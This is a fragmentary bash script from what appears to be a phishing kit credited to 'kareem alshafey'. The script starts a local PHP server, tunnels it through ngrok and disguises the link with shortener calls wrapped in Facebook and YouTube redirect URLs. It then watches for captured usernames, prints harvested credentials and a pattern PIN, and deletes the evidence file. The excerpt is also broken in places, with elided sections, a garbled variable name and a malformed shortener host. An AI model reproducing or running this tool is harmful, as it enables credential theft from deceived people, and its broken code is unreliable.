...
printf "\n"
printf "                \e[104m\e[1;77m  >>my number +201068960354<< \e[0m\n"
printf "\n"
printf "  \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m youtube.com/kareem alshafey\e[100m\e[1;77m << \e[0m\n"
printf "\n"
...
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Pattern-pin by kareem:\e[0m\e[1;77m %s\n\e[0m" $password
...
serverx() {
printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server by kareem...\n"
cd core/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server alshafey...\e[0m\n"
...
send_ip=$(curl -s "http://alshafey.com/api-create.php?url=www.facebook.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$send_link" | head -n1)
#send_ip=$(curl -s http://alshafey.com/api-create.php?url=$send_link | head -n1)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using alshafey:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"
checkfound
...
sleep 2
printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server by kareemalshafey...\n"
...
send_ip=$(curl -s "http://tinyurl/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link" | head -n1)
#send_ip=$(curl -s http://alshafey.com/api-create.php?url=$send_link | head -n1)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using alshafey:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"
...
#option_server="${option_serv.comer:-${default_option_server}}"
...
if [[ -e "core/$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Pattern  Found alshafey!\n"
catch_cred
rm -rf core/$server/usernames.txt
fi
sleep 0.5
